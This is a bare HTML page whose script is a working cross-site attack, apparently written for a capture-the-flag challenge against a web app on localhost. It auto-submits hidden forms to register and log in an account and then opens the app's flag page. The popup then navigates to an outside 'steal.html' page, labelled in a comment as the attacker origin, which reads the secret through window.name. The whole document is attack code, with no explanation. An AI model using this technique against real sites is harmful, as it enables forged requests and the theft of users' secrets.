<!DOCTYPE html>
<html>
<body>
<script>
var popup = window.open('about:blank', 'popup');

// 1. register
var f1 = document.createElement("form");
f1.method = "POST";
f1.action = "http://localhost:3000/register";
f1.target = "popup";
f1.innerHTML = `
<input name="username" value="poptest">
<input name="password" value="poptest">
`;
document.body.appendChild(f1);
f1.submit();

// 2. login
setTimeout(() => {
  var f2 = document.createElement("form");
  f2.method = "POST";
  f2.action = "http://localhost:3000/login";
  f2.target = "popup";
  f2.innerHTML = `
  <input name="username" value="poptest">
  <input name="password" value="poptest">
  `;
  document.body.appendChild(f2);
  f2.submit();
}, 200);

// 3. flag → window.name 세팅 페이지
setTimeout(() => {
  popup.location = "http://localhost:3000/flag";
}, 500);

// 4. attacker origin으로 이동
setTimeout(() => {
  popup.location = "https://kiranshownny.github.io/webtest/steal.html";
}, 900);
</script>
</body>
</html>